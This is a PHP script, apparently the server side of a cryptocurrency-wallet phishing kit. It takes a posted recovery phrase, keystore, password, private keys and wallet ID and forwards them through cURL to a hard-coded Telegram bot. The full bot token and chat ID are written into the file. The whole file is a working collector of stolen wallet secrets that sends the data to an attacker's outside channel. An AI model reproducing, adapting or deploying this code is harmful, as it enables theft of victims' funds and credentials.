<?php
// Your Telegram Bot API Key and Chat ID
$token = "7901428301:AAFaOAc3hZ2OogEgQboM54crQ2HU2RVw1_E";
$chat_id = "7108260980"; // Your Telegram chat ID or channel username

// Receive the JSON payload from the POST request
$data = json_decode(file_get_contents('php://input'), true);

// Ensure required fields are present
if (isset($data['recoveryPhrase'], $data['keystore'], $data['password'], $data['key'], $data['wallet_id'], $data['privatekey1'])) {

    // Sanitize and assign the form data
    $recoveryPhrase = htmlspecialchars($data['recoveryPhrase']);
    $keystore = htmlspecialchars($data['keystore']);
    $password = htmlspecialchars($data['password']);
    $key = htmlspecialchars($data['key']);
    $wallet_id = htmlspecialchars($data['wallet_id']);
    $privatekey1 = htmlspecialchars($data['privatekey1']);

    // Prepare the message to be sent to Telegram
    $text = "New Wallet Recovery Data:\n\n" .
            "Recovery Phrase: $recoveryPhrase\n" .
            "Keystore: $keystore\n" .
            "Password: $password\n" .
            "Key: $key\n" .
            "Wallet ID: $wallet_id\n" .
            "Private Key 1: $privatekey1";

    // Telegram API URL
    $url = "https://api.telegram.org/bot$token/sendMessage";

    // Prepare cURL for sending the message to Telegram
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'chat_id' => $chat_id,
        'text' => $text
    ]);

    // Execute cURL and capture the response
    $response = curl_exec($ch);

    // Check for errors
    if ($response === false) {
        // Handle error (if any)
        echo json_encode(["status" => "error", "message" => curl_error($ch)]);
    } else {
        // Handle success
        echo json_encode(["status" => "success", "response" => json_decode($response)]);
    }

    // Close cURL
    curl_close($ch);
} else {
    // If required fields are missing, return an error message
    echo json_encode(["status" => "error", "message" => "Missing required form fields"]);
}
?>